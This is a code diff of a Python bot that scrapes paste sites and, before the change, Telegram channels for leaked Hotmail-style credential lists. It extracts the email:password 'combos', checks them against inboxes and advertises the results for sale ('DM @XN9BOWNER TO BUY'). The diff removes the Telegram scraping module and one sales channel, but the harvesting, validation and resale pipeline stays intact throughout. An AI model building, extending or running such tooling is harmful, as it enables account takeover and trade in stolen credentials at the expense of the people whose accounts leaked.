@@ -43,11 +43,6 @@ MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotma
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 PASTEDPW_URL     = "https://pasted.pw/recent.php"
-# Telegram channels to monitor (add channel usernames without @)
-TG_MONITOR_CHANNELS = os.environ.get("TG_MONITOR_CHANNELS", "").split(",")  # e.g. "channel1,channel2"
-TG_API_ID           = os.environ.get("TG_API_ID", "")
-TG_API_HASH         = os.environ.get("TG_API_HASH", "")
-TG_PHONE            = os.environ.get("TG_PHONE", "")
 SEEN_FILE        = "seen_urls.json"
 EMPTY_SCAN_ALERT = 10
 KEYWORDS         = ["hotmail", "hits", "mixed"]
@@ -439,77 +434,6 @@ async def run_inbox_checker(combos: list) -> dict:
     return service_map
 
 
-# ─── TELEGRAM CHANNEL MONITOR ────────────────────────────────────────────────
-tg_client = None
-
-async def init_telegram_client():
-    """Initialize Telethon client."""
-    global tg_client
-    if not TG_API_ID or not TG_API_HASH or not TG_PHONE:
-        log.warning("Telegram monitor not configured — set TG_API_ID, TG_API_HASH, TG_PHONE")
-        return
-    try:
-        from telethon import TelegramClient
-        tg_client = TelegramClient("mercury_session", int(TG_API_ID), TG_API_HASH)
-        await tg_client.start(phone=TG_PHONE)
-        log.info("Telegram client connected")
-    except Exception as e:
-        log.error(f"Failed to init Telegram client: {e}")
-        tg_client = None
-
-
-async def scrape_telegram_channels() -> list[dict]:
-    """Scrape monitored Telegram channels for new keyword-matching messages."""
-    if not tg_client or not TG_MONITOR_CHANNELS or TG_MONITOR_CHANNELS == [""]:
-        return []
-    found = []
-    try:
-        from telethon.tl.types import MessageMediaDocument
-        for channel in TG_MONITOR_CHANNELS:
-            channel = channel.strip()
-            if not channel:
-                continue
-            try:
-                async for msg in tg_client.iter_messages(channel, limit=50):
-                    if not msg.text and not msg.message:
-                        continue
-                    text = (msg.text or msg.message or "").strip()
-                    title_lower = text[:100].lower()
-                    if any(k in title_lower for k in KEYWORDS) and not any(b in title_lower for b in BLACKLIST):
-                        msg_url = f"tg://{channel}/{msg.id}"
-                        if msg_url not in posted_urls:
-                            # Extract combos directly from message text
-                            creds = extract_credentials(text)
-                            if creds:
-                                found.append({
-                                    "title": text[:60],
-                                    "url": msg_url,
-                                    "source": "telegram",
-                                    "content": "\n".join(creds)
-                                })
-                            # Also check for .txt file attachments
-                            elif msg.media and isinstance(msg.media, MessageMediaDocument):
-                                try:
-                                    data = await tg_client.download_media(msg, bytes)
-                                    raw = data.decode("utf-8", errors="ignore")
-                                    creds = extract_credentials(raw)
-                                    if creds:
-                                        found.append({
-                                            "title": text[:60] or f"tg_{channel}_{msg.id}",
-                                            "url": msg_url,
-                                            "source": "telegram",
-                                            "content": "\n".join(creds)
-                                        })
-                                except Exception as e:
-                                    log.error(f"Failed to download TG attachment: {e}")
-                log.info(f"Telegram @{channel}: {len(found)} match(es)")
-            except Exception as e:
-                log.error(f"Failed to scrape Telegram @{channel}: {e}")
-    except Exception as e:
-        log.error(f"Telegram scrape error: {e}")
-    return found
-
-
 # ─── PASTED.PW ───────────────────────────────────────────────────────────────
 async def scrape_pastedpw(page, pages: int = 5) -> list[dict]:
     """Scrape pasted.pw using Playwright to bypass Cloudflare."""
@@ -660,21 +584,6 @@ async def monitor_loop():
                     found.extend(pw_found)
                 except Exception as e:
                     log.error(f"pasted.pw scrape failed: {e}")
-
-                # ── Also scrape Telegram channels ─────────────────────
-                try:
-                    tg_found = await scrape_telegram_channels()
-                    if tg_found:
-                        log.info(f"Telegram: {len(tg_found)} match(es)")
-                        for item in tg_found:
-                            if item["url"] not in posted_urls:
-                                posted_urls.add(item["url"])
-                                # Post content directly
-                                content_str = item.get("content", "")
-                                if content_str:
-                                    combined.append(content_str)
-                except Exception as e:
-                    log.error(f"Telegram channel scrape failed: {e}")
 
                 # Deduplicate and filter blacklisted titles
                 seen_this_run = set()
@@ -849,7 +758,7 @@ async def monitor_loop():
                                     pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                     promo_path = os.path.join("/app", "promo.png")
                                     async with aiohttp.ClientSession() as sess:
-                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
+                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT]:  # TELEGRAM_PUBLIC_CHAT2 disabled
                                             try:
                                                 if os.path.exists(promo_path):
                                                     form = aiohttp.FormData()
@@ -977,7 +886,6 @@ async def on_ready():
         log.info("Monitor already running after reconnect")
     if not watchdog.is_running():
         watchdog.start()
-    await init_telegram_client()
 
 @bot.event
 async def on_resumed():
@@ -987,7 +895,6 @@ async def on_resumed():
         log.info("Monitor restarted after resume")
     if not watchdog.is_running():
         watchdog.start()
-    await init_telegram_client()
 
 # ─── RUN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
